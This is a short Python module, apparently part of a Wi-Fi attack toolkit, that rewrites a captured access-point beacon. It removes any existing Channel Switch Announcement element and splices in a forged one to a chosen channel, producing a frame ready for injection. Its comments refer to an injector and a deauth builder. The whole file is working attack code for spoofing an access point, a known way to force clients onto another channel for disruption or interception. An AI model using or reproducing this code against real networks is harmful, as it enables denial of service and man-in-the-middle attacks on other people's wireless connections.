"""CSA beacon rewrite: splice a Channel Switch Announcement into a captured beacon (pure spec)."""
from wifit3.dot11.ie import csa_ie

_ELEMID_CSA = 0x25
_BEACON_BODY_LEN = 36   # 24B MAC header + 12B fixed (timestamp, interval, capability); IEs follow


def build_csa_beacon(beacon: bytes, new_channel: int, count: int = 0) -> bytes:
    """The AP's beacon, sequence-control zeroed (the injector re-stamps each frame), with any
    existing CSA element replaced by a fresh CSA to ``new_channel``. ``count`` is the Channel
    Switch Count (0 = switch immediately; N = switch after N more beacons). Injectable MPDU."""
    if len(beacon) < _BEACON_BODY_LEN:
        raise ValueError(f"beacon too short to rewrite: {len(beacon)} bytes")
    header = bytearray(beacon[:_BEACON_BODY_LEN])
    header[22:24] = b"\x00\x00"           # seq/frag control: HW-stamped per frame, like the deauth builder
    tags = beacon[_BEACON_BODY_LEN:]
    kept = bytearray()
    ptr = 0
    while ptr + 2 <= len(tags):
        end = ptr + 2 + tags[ptr + 1]
        if end > len(tags):
            break
        if tags[ptr] != _ELEMID_CSA:
            kept += tags[ptr:end]
        ptr = end
    return bytes(header) + bytes(kept) + csa_ie(new_channel, count=count)
